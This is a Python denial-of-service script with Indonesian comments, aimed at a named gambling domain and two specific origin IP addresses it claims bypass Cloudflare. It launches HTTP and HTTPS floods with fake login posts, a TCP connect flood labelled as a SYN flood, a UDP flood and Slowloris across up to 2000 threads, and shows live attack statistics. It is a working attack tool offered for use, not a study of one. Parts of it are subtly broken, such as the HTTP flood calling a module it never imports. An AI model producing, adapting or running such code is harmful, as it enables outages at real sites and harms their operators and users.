#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import threading
import random
import time
import requests
import sys
import os
from concurrent.futures import ThreadPoolExecutor
import ssl
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========== KONFIGURASI TARGET ==========
TARGET_DOMAIN = 'lemapan.hair'
TARGET_IPS = ['92.243.74.2', '92.243.74.3']  # IP ASLI, BUKAN CLOUDFLARE!
TARGET_PORTS = [80, 443, 8080, 8443, 8888]

# ENDPOINT YANG UMUM DI SITUS TOGEL
ENDPOINTS = [
    '/',
    '/login',
    '/register',
    '/togel',
    '/livecasino',
    '/slot',
    '/prediksi',
    '/result',
    '/history',
    '/bukumimpi',
    '/erekerek',
    '/referral',
    '/promo',
    '/bank',
    '/deposit',
    '/withdraw',
    '/api/v1/login',
    '/api/v1/register',
    '/api/v1/balance',
    '/api/v1/history'
]

# USER AGENTS
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
]

# ========== FUNGSI SERANGAN ==========

def http_flood(ip, stats):
    """HTTP Flood ke IP asli (tembus Cloudflare!)"""
    while stats['running']:
        try:
            endpoint = random.choice(ENDPOINTS)
            method = random.choice(['GET', 'POST'])
            ua = random.choice(USER_AGENTS)
            
            headers = {
                'User-Agent': ua,
                'Host': TARGET_DOMAIN,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'id-ID,id;q=0.9,en;q=0.8',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache'
            }
            
            if method == 'POST':
                data = f"username=test{random.randint(1,999)}&password=123456"
                conn = http.client.HTTPConnection(ip, port=80, timeout=1)
                conn.request('POST', endpoint, body=data, headers=headers)
            else:
                conn = http.client.HTTPConnection(ip, port=80, timeout=1)
                conn.request('GET', endpoint, headers=headers)
            
            response = conn.getresponse()
            response.read()
            conn.close()
            
            stats['success'] += 1
            stats['total'] += 1
            
            if stats['total'] % 100 == 0:
                print(f"  ✅ {stats['success']} success | ❌ {stats['failed']} failed | 📦 {stats['total']} total")
                
        except Exception as e:
            stats['failed'] += 1
            stats['total'] += 1

def https_flood(ip, stats):
    """HTTPS Flood (kalo mereka pake SSL)"""
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    
    while stats['running']:
        try:
            endpoint = random.choice(ENDPOINTS)
            ua = random.choice(USER_AGENTS)
            
            headers = f"GET {endpoint} HTTP/1.1\r\nHost: {TARGET_DOMAIN}\r\nUser-Agent: {ua}\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n"
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((ip, 443))
            ssl_sock = context.wrap_socket(sock, server_hostname=TARGET_DOMAIN)
            ssl_sock.send(headers.encode())
            ssl_sock.recv(1024)
            ssl_sock.close()
            
            stats['success'] += 1
            stats['total'] += 1
            
        except Exception as e:
            stats['failed'] += 1
            stats['total'] += 1

def syn_flood(ip, stats):
    """SYN Flood - serangan level TCP"""
    while stats['running']:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(0.1)
            sock.connect((ip, 80))
            sock.send(b"GET / HTTP/1.1\r\nHost: " + TARGET_DOMAIN.encode() + b"\r\n\r\n")
            sock.close()
            stats['syn_success'] += 1
        except:
            stats['syn_failed'] += 1

def udp_flood(ip, stats):
    """UDP Flood - serangan random port"""
    while stats['running']:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = random._urandom(1024)
            port = random.choice([80, 443, 53, 123, 8080, 8443, 8888, 9999])
            sock.sendto(data, (ip, port))
            stats['udp_sent'] += 1
        except:
            stats['udp_failed'] += 1

def slowloris(ip, stats):
    """Slowloris - tahan koneksi tetap hidup"""
    sockets = []
    
    # Bikin 200 koneksi awal
    for _ in range(200):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((ip, 80))
            sock.send(f"GET / HTTP/1.1\r\nHost: {TARGET_DOMAIN}\r\n".encode())
            sock.send("User-Agent: Mozilla/5.0\r\n".encode())
            sock.send("Accept-language: en-US,en\r\n".encode())
            sockets.append(sock)
            stats['slowloris'] += 1
        except:
            pass
    
    # Jaga koneksi tetap hidup
    while stats['running']:
        for s in sockets[:]:
            try:
                s.send(f"X-a: {random.randint(1,9999)}\r\n".encode())
                stats['slowloris_keep'] += 1
            except:
                sockets.remove(s)
                stats['slowloris_dead'] += 1
                # Buat koneksi baru
                try:
                    s_new = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s_new.settimeout(2)
                    s_new.connect((ip, 80))
                    s_new.send(f"GET / HTTP/1.1\r\nHost: {TARGET_DOMAIN}\r\n".encode())
                    sockets.append(s_new)
                except:
                    pass
        time.sleep(10)

# ========== FUNGSI MONITOR ==========

def monitor(stats, target_ips):
    """Monitor serangan real-time"""
    try:
        while stats['running']:
            time.sleep(5)
            os.system('clear')
            
            print("="*60)
            print(f"🔥 DDOS PREMIUM - TARGET: {TARGET_DOMAIN}")
            print(f"📍 IP TARGET: {target_ips}")
            print("="*60)
            print(f"📊 STATISTIK SERANGAN:")
            print(f"   ✅ HTTP Success: {stats['success']}")
            print(f"   ❌ HTTP Failed: {stats['failed']}")
            print(f"   📦 Total HTTP: {stats['total']}")
            print(f"   🔴 SYN Success: {stats.get('syn_success', 0)}")
            print(f"   🔴 SYN Failed: {stats.get('syn_failed', 0)}")
            print(f"   💧 UDP Sent: {stats.get('udp_sent', 0)}")
            print(f"   🐌 Slowloris: {stats.get('slowloris', 0)}")
            print("="*60)
            
            # Cek koneksi via netstat
            try:
                result = os.popen(f"netstat -an | grep -E \"{'|'.join(target_ips)}\" | wc -l").read()
                print(f"🔌 Koneksi aktif: {result.strip()}")
            except:
                pass
            
            print("="*60)
            print("Tekan Ctrl+C untuk berhenti")
            
    except KeyboardInterrupt:
        stats['running'] = False
        print("\n\n🛑 Menghentikan serangan...")

# ========== MAIN FUNCTION ==========

def main():
    print("""
╔══════════════════════════════════════════════════════════════╗
║     D A N  -  P R E M I U M  D D O S  E N G I N E           ║
║              T A R G E T:  PAN4D (lemapan.hair)             ║
║                    MODE: IP ASLI - TEMBUS CLOUDFLARE!       ║
║              DENGAN INDIKATOR ✅ SUCCESS ❌ FAIL              ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    print(f"\n🎯 Target Domain: {TARGET_DOMAIN}")
    print(f"📍 Target IPs: {TARGET_IPS}")
    print(f"📡 Mode: Serangan LANGSUNG ke IP ASLI (bukan Cloudflare!)")
    print(f"🔥 5 LAYER SERANGAN: HTTP Flood + HTTPS Flood + SYN Flood + UDP Flood + Slowloris")
    print("="*60)
    
    stats = {
        'running': True,
        'success': 0,
        'failed': 0,
        'total': 0,
        'syn_success': 0,
        'syn_failed': 0,
        'udp_sent': 0,
        'udp_failed': 0,
        'slowloris': 0,
        'slowloris_keep': 0,
        'slowloris_dead': 0
    }
    
    # Mulai thread monitor
    monitor_thread = threading.Thread(target=monitor, args=(stats, TARGET_IPS))
    monitor_thread.daemon = True
    monitor_thread.start()
    
    # Jalankan thread serangan
    with ThreadPoolExecutor(max_workers=2000) as executor:
        # HTTP Flood ke port 80
        for ip in TARGET_IPS:
            for _ in range(200):
                executor.submit(http_flood, ip, stats)
        
        # HTTPS Flood ke port 443
        for ip in TARGET_IPS:
            for _ in range(100):
                executor.submit(https_flood, ip, stats)
        
        # SYN Flood
        for ip in TARGET_IPS:
            for _ in range(200):
                executor.submit(syn_flood, ip, stats)
        
        # UDP Flood
        for ip in TARGET_IPS:
            for _ in range(100):
                executor.submit(udp_flood, ip, stats)
        
        # Slowloris
        for ip in TARGET_IPS:
            executor.submit(slowloris, ip, stats)
    
    print(f"\n✅ {200*len(TARGET_IPS)*2 + 100*len(TARGET_IPS)*2 + 200*len(TARGET_IPS) + 100*len(TARGET_IPS)} thread serangan dimulai!")
    print(f"🔥 SERANGAN DIMULAI! Target: {TARGET_DOMAIN} ({TARGET_IPS})")
    
    try:
        while stats['running']:
            time.sleep(1)
    except KeyboardInterrupt:
        stats['running'] = False
        print("\n\n🛑 Serangan dihentikan oleh user")
    
    # Final stats
    print("\n" + "="*60)
    print("📊 STATISTIK FINAL:")
    print(f"   ✅ HTTP Success: {stats['success']}")
    print(f"   ❌ HTTP Failed: {stats['failed']}")
    print(f"   📦 Total HTTP: {stats['total']}")
    print(f"   📈 Success rate: {stats['success']/(stats['total'] or 1)*100:.1f}%")
    print("="*60)

if __name__ == "__main__":
    main()
